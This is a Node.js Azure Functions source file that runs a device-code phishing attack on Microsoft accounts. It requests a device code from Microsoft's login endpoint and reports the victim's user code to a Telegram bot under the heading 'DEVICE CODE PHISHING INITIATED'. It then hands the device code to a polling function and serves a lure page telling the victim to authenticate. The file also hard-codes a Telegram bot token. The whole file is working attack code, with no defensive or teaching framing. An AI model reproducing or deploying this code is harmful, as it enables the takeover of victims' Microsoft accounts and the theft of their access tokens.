const { app } = require("@azure/functions");
const axios = require('axios')

const client_id = '00b41c95-dab0-4487-9791-b9d2c32c80f2';
const resource = "https://graph.microsoft.com/";
const token_endpoint = "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0";

// Telegram Bot Configuration
const TELEGRAM_BOT_TOKEN = '7768080373:AAEo6R8wNxUa6_NqPDYDIAfQVRLHRF5fBps';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || ''; // Set this in Azure app settings

async function sendTelegramAlert(message) {
  if (!TELEGRAM_CHAT_ID) {
    console.log('Telegram Chat ID not configured');
    return;
  }
  
  try {
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: 'Markdown'
    });
  } catch (error) {
    console.error('Telegram notification failed:', error.message);
  }
}

app.http("landing", {
  methods: ["GET"],
  authLevel: "anonymous",
  route: "/deviceCode",
  handler: async (request, context) => {

    const devicecode = await axios.post(token_endpoint, {
      'client_id': client_id,
      'resource': '0000000c-0000-0000-c000-000000000000',
      // 'amr_values': 'ngcmfa',
    }, {
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        // 'User-Agent': 'AzureAiTMFunction'
      }
    }).then(response => {
      //context.log(`Received response with status: ${response.status}`)
      return response.data
    })
      .catch((ex) => console.error(ex))

    context.log(`Device code: ${JSON.stringify(devicecode)}`)
    
    // Send Telegram notification
    const telegramMessage = `🎯 *DEVICE CODE PHISHING INITIATED*\n\n` +
      `*User Code:* \`${devicecode.user_code}\`\n` +
      `*Verification URL:* ${devicecode.verification_uri}\n` +
      `*Expires:* ${devicecode.expires_in} seconds\n` +
      `*Time:* ${new Date().toISOString()}\n\n` +
      `*Status:* Waiting for user authentication...`;
    
    await sendTelegramAlert(telegramMessage);
    
    // dispatch to deviceCode poll function
    axios.put(request.url, {
      'device_code': devicecode.device_code
    }).catch((ex) => console.error(ex));

    const response = `"
    <html lang="en">
    <head>
    <title>Azure Device Code Function</title>
    <body style = "text-align: center;">
    <h1>Hi Darling</h1>
    <p>Please visit: <a href=${devicecode.verification_url} target="blank"> ${devicecode.verification_url}</a> to authenticate and enter the code: <pre>${devicecode.user_code}</pre><p>
    <pre></pre>
    <img src="https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fwhatismyipaddress.com%2Fwp-content%2Fuploads%2Fphishing-links-1024x512.jpg&f=1&nofb=1&ipt=528ceabd47cc43fcf3b743d55a791647bf80cf8461034c858a7d274dddfdacf4&ipo=images">
    </body>
    </html>
    "`

    return new Response(response.substring(1, response.length - 2), {
      status: 200,
      headers: {
        'Content-Type': 'text/html; charset=utf-8',
        'X-Content-Type-Options': 'nosniff'
      }
    });
  },
});